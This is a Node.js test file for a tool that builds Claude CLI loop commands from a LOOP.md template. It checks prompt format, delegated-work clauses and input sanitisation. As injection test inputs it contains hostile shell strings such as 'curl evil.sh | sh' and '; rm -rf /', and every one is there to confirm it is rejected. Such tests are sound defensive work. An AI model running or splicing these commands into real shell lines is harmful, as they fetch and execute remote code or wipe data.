'use strict';
// buildLoopCommand slices the ## Automation section out of LOOP.md and requires a fenced block
// THERE (not the first fence in the file — LOOP.md has several earlier fences).
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const {
  buildLoopCommand, buildClaudeBase,
  PERMISSION_MODES, isValidPermissionMode, sanitizePermissionMode,
  isValidLoopInterval, sanitizeLoopInterval,
} = require('../out-test/loop.js');
const { parseTodo } = require('../out-test/parser.js');
const { serializeTodo } = require('../out-test/writer.js');

function readMedia(name) {
  return fs.readFileSync(path.join(process.cwd(), 'media', name), 'utf8');
}

// The standing worker instructions are the FIRST fence of the ## Automation section — not the
// first fence in the file (LOOP.md has several earlier ones), which is the same slice
// buildLoopCommand performs.
function automationFence(text) {
  const fence = text.slice(text.indexOf('## Automation')).split('```')[1];
  assert.ok(fence, 'Automation section has a fenced block');
  return fence;
}

test('buildLoopCommand: bootstrap prompt names model + interval + effort ceiling, points at .loopboard/LOOP.md', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'sonnet', '5m', 'xhigh');
  assert.ok(!cmd.includes('Delegate work'), 'delegation off by default: no activation phrase');
  assert.ok(cmd, 'a loop command was built from the shipped LOOP.md template');
  assert.match(cmd, /^\/loop 5m /, 'interval honored');
  assert.ok(cmd.includes('running as model sonnet'), 'model injected');
  assert.ok(cmd.includes('subagent effort ceiling of xhigh'), 'effort ceiling injected (caps grooming AND delegated subagents, t-e3c3)');
  assert.ok(cmd.includes('.loopboard/LOOP.md'), 'points at LOOP.md');
  assert.ok(cmd.includes('Automation section'), 'directs the worker to the Automation section');
  assert.ok(!cmd.includes("'"), 'no apostrophes (short-argv escaping constraint)');
  assert.ok(!cmd.includes('\n'), 'single line for the TUI paste');
  assert.ok(cmd.length < 300, 'bootstrap prompt stays tiny');
});

// The finishing order is a guarantee, not prose: if `phase: review` is set before the push, an
// interrupted worker leaves a Review task whose branch is missing or stale. Pin the ordered
// clause so a later compression pass cannot silently drop it (t-16d2).
test('template Automation block states the strict finishing order (Review move LAST)', () => {
  const fence = automationFence(readMedia('template-loop.md'));
  assert.match(fence, /LAST action, set `phase: review`/, 'Review move named as the last action');
  assert.ok(
    fence.indexOf('commit and push') < fence.indexOf('set `phase: review`'),
    'commit and push is ordered before the Review move',
  );
});

// The extension cannot read terminal output, so "do not idle until the next tick while eligible
// work remains" can only live in the instructions. Pin the clause and its terminator (t-ff77).
test('template Automation block tells a finished worker to start the pass over', () => {
  const fence = automationFence(readMedia('template-loop.md'));
  assert.match(fence, /does NOT end the pass/, 'a task leaving In Progress does not end the pass');
  assert.match(fence, /START OVER from the top of this block in the same pass/, 'restart is named');
  assert.match(fence, /nothing claimed and nothing reconciled/, 'loop-until-idle terminator');
  assert.match(fence, /NEVER idle until the next tick/, 'stated in NEVER terms');
  assert.ok(
    fence.indexOf('does NOT end the pass') > fence.indexOf('set `phase: review`'),
    'the restart clause follows the delivery and the Feedback-parking sentences it covers',
  );
});

test('buildLoopCommand: effort defaults to high when omitted', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m');
  assert.ok(cmd.includes('subagent effort ceiling of high'));
});

test('buildLoopCommand: an invalid effort falls back to high rather than reaching the prompt raw', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m', 'extreme; rm -rf /');
  assert.ok(cmd.includes('subagent effort ceiling of high'));
  assert.ok(!cmd.includes('extreme'));
  assert.ok(!cmd.includes('rm -rf'));
});

test('buildClaudeBase single-quotes the --model so glob metachars (haiku[1m]) do not expand', () => {
  assert.equal(
    buildClaudeBase('auto', 'haiku[1m]'),
    "claude --permission-mode auto --model 'haiku[1m]'"
  );
  // A plain id is quoted too — harmless, and keeps one code path.
  assert.equal(buildClaudeBase('acceptEdits', 'opus'), "claude --permission-mode acceptEdits --model 'opus'");
});

// t-2b89: the session name is what matches a slot to its `~/.claude/sessions/<pid>.json`, so it
// must actually reach the spawn line — and the line must stay apostrophe-free outside the quoted
// --model, since the whole command is re-quoted around the /loop prompt.
test('buildClaudeBase appends --name when a session name is given', () => {
  const line = buildClaudeBase('auto', 'opus[1m]', 'loopboard-opus');
  assert.equal(line, "claude --permission-mode auto --model 'opus[1m]' --name loopboard-opus");
  assert.ok(!buildClaudeBase('auto', 'opus').includes('--name'), 'omitted when no name is given');
});

test('isValidPermissionMode: accepts every package.json enum value, rejects anything else', () => {
  for (const m of PERMISSION_MODES) assert.ok(isValidPermissionMode(m), `${m} is valid`);
  assert.ok(!isValidPermissionMode('auto; curl evil.sh | sh'), 'shell injection rejected');
  assert.ok(!isValidPermissionMode(''), 'empty rejected');
  assert.ok(!isValidPermissionMode('AUTO'), 'case-sensitive');
});

test('sanitizePermissionMode: passes valid through, falls back to auto otherwise', () => {
  assert.equal(sanitizePermissionMode('bypassPermissions'), 'bypassPermissions');
  assert.equal(sanitizePermissionMode('auto; rm -rf /'), 'auto');
  assert.equal(sanitizePermissionMode(''), 'auto');
});

test('buildClaudeBase sanitizes an injected permissionMode so the shell line stays safe', () => {
  const line = buildClaudeBase('auto; curl evil.sh | sh', 'opus');
  assert.equal(line, "claude --permission-mode auto --model 'opus'");
  assert.ok(!line.includes('curl'), 'the injected payload never reaches the shell line');
});

test('isValidLoopInterval: accepts <digits><s|m|h|d>, rejects garbage/injection', () => {
  for (const ok of ['1m', '5m', '30s', '2h', '7d', '10m']) assert.ok(isValidLoopInterval(ok), `${ok} valid`);
  for (const bad of ['', '1', 'm', '1x', '1m; ls', '-1m', '1 m', '1M']) assert.ok(!isValidLoopInterval(bad), `${bad} invalid`);
});

test('sanitizeLoopInterval falls back to 1m for invalid values', () => {
  assert.equal(sanitizeLoopInterval('5m'), '5m');
  assert.equal(sanitizeLoopInterval('1m; rm -rf /'), '1m');
  assert.equal(sanitizeLoopInterval('nonsense'), '1m');
});

test('buildLoopCommand sanitizes the interval before splicing it into the prompt', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '5m; echo pwned');
  assert.ok(cmd, 'a command was built');
  assert.match(cmd, /^\/loop 1m /, 'invalid interval falls back to 1m');
  assert.ok(!cmd.includes('pwned'), 'the injected payload never reaches the prompt');
});

test('buildLoopCommand: undefined when there is no ## Automation section', () => {
  assert.equal(buildLoopCommand('# LOOP\n\n## Rules\n\n```\nsome fence\n```\n', 'opus', '1m'), undefined);
});

test('buildLoopCommand: undefined when Automation has no fenced block', () => {
  assert.equal(buildLoopCommand('# LOOP\n\n## Automation\n\nNo code block here.\n', 'opus', '1m'), undefined);
});

test('buildLoopCommand: an earlier fence (before ## Automation) is NOT picked', () => {
  // The Storage/Workflow fences come first; Automation itself has no fence -> undefined.
  const text = [
    '# LOOP', '', '## Storage', '', '```', 'layout', '```', '',
    '## Automation', '', 'Prose only, no fenced block.', '',
  ].join('\n');
  assert.equal(buildLoopCommand(text, 'opus', '1m'), undefined);
});

test('template-todo.md scaffold parses to zero entries and is a fixpoint', () => {
  const src = readMedia('template-todo.md');
  const doc = parseTodo(src);
  assert.equal(doc.entries.length, 0, 'scaffold starts with no tasks');
  const once = serializeTodo(doc);
  const twice = serializeTodo(parseTodo(once));
  assert.equal(twice, once, 'fixpoint');
});

// ---- grooming concurrency cap (t-23ce) ----
// The cap rides the bootstrap prompt because the sync path copies template blocks byte-for-byte
// with no interpolation — LOOP.md can carry the BEHAVIOUR but never a configured NUMBER.

test('buildLoopCommand: the grooming concurrency cap is spliced into the prompt', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m', 'high', 5);
  assert.ok(cmd.includes('grooming concurrency cap of 5'), 'cap injected');
  assert.ok(!cmd.includes("'"), 'still apostrophe-free');
  assert.ok(!cmd.includes('\n'), 'still a single line');
  assert.ok(cmd.length < 300, 'still inside the bootstrap line budget');
});

test('buildLoopCommand: the cap defaults to 3 when omitted', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m');
  assert.ok(cmd.includes('grooming concurrency cap of 3'));
});

test('buildLoopCommand: a hostile or out-of-range cap falls back to 3, never reaching the line raw', () => {
  // The value is spliced into a shell line, so anything not a plain in-range integer must not
  // survive. There is deliberately no `0 = unlimited` sentinel.
  for (const bad of ['5; rm -rf /', 0, -1, 1.5, NaN, Infinity, 100, null, undefined, {}]) {
    const cmd = buildLoopCommand(readMedia('template-loop.md'), 'opus', '1m', 'high', bad);
    assert.ok(cmd.includes('grooming concurrency cap of 3'), `expected ${JSON.stringify(bad)} -> 3`);
    assert.ok(!cmd.includes('rm -rf'));
  }
});

test('the template states the cap behaviour without embedding a number', () => {
  // LOOP.md must never hard-code the cap: it is per-slot and configurable, and the sync path
  // would copy the constant into every workspace identically.
  const tpl = readMedia('template-loop.md');
  assert.ok(tpl.includes('grooming concurrency cap named in your bootstrap prompt'));
  assert.ok(tpl.includes('index order'), 'names the tie-break');
  assert.match(tpl, /skipped task by title|by title in your report/, 'names the over-cap report');
});

// Delegated-work mode (t-e3c3): `loopBoard.delegateWork` / `loopBoard.delegateWork.review` ride the
// bootstrap prompt as a short activation PHRASE only — the behaviour for each mode lives in the
// template's Automation block, so the phrase and the clause are pinned together here.
const DELEGATE_ON = ' Delegate work to subagents.';
const DELEGATE_NO_REVIEW = ' Delegate work to subagents without review.';

function assertBootstrapShape(cmd) {
  assert.ok(cmd.includes('.loopboard/LOOP.md') && cmd.includes('Automation section'), 'still points at the Automation section');
  assert.ok(cmd.includes('grooming concurrency cap of'), 'still names the grooming cap');
  assert.ok(!cmd.includes("'"), 'apostrophe-free (single-quoted argv)');
  assert.ok(!cmd.includes('\n'), 'single line');
  assert.ok(cmd.length < 300, 'inside the bootstrap line budget (not raised): ' + cmd.length);
}

test('buildLoopCommand: delegateWork off (explicit, absent, or non-boolean) appends no activation phrase whatever the review flag says', () => {
  const tpl = readMedia('template-loop.md');
  const base = buildLoopCommand(tpl, 'sonnet', '5m', 'xhigh', 3);
  for (const off of [false, undefined, null, 'true', 1, {}]) {
    for (const review of [true, false, undefined]) {
      const cmd = buildLoopCommand(tpl, 'sonnet', '5m', 'xhigh', 3, off, review);
      assert.equal(cmd, base, `delegateWork=${JSON.stringify(off)} review=${JSON.stringify(review)} must equal the plain prompt`);
    }
  }
  assert.ok(!base.includes('Delegate work'));
  assertBootstrapShape(base);
});

test('buildLoopCommand: delegateWork on with review on (explicit or absent) ends the prompt with the plain activation phrase', () => {
  const tpl = readMedia('template-loop.md');
  for (const review of [true, undefined]) {
    const cmd = buildLoopCommand(tpl, 'sonnet', '5m', 'xhigh', 3, true, review);
    assert.ok(cmd.endsWith(DELEGATE_ON), 'activation phrase appended last');
    assert.ok(!cmd.includes('without review'));
    assertBootstrapShape(cmd);
  }
});

test('buildLoopCommand: delegateWork on with review off ends the prompt with the without-review phrase', () => {
  const cmd = buildLoopCommand(readMedia('template-loop.md'), 'sonnet', '5m', 'xhigh', 3, true, false);
  assert.ok(cmd.endsWith(DELEGATE_NO_REVIEW));
  assertBootstrapShape(cmd);
});

test('template Automation block spells out the delegated-work mode the activation phrases switch on', () => {
  const fence = automationFence(readMedia('template-loop.md'));
  assert.ok(fence.includes('DELEGATED-WORK MODE'), 'clause present');
  assert.ok(fence.includes('`Delegate work to subagents`'), 'keyed on the activation phrase');
  assert.ok(fence.includes('`without review`'), 'names the review-off variant');
  assert.match(fence, /subagent effort ceiling/, 'implementer capped by the same ceiling as grooming');
  assert.match(fence, /no git worktree, no --no-verify/, 'implementer inherits the git contract');
  assert.match(fence, /writes any `\.loopboard\/` file/, 'subagents never write the tracker');
  assert.match(fence, /gh pr merge <url> --squash --delete-branch/, 'pass path merges by squash');
  assert.match(fence, /re-delegate ONCE/, 'fail path: one re-delegation');
  assert.match(fence, /second fail → `phase: feedback`/, 'then Feedback with the findings');
  assert.match(fence, /never self-accept/, 'Rule 1 gate survives');
  assert.ok(fence.indexOf('DELEGATED-WORK MODE') > fence.indexOf('reply "no changes"'), 'the clause trails the ordinary pass so the base instructions are untouched');
});
